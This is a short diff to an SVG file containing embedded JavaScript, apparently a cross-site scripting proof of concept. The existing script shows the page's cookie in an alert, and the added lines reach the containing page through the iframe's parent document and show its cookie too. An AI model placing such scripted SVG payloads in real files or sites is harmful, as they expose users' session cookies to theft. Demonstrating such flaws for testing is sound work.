@@ -17,6 +17,9 @@
 	  alrt += '\r\n\r\nCookie: '  + document.cookie;
 	  alert(alrt);
 	  
+	  var ifrm = window.frameElement; // reference to iframe element container
+      var doc = ifrm.ownerDocument; // reference to container's document
+	  alert(doc.cookie);
 	  
    </script>
 </svg>
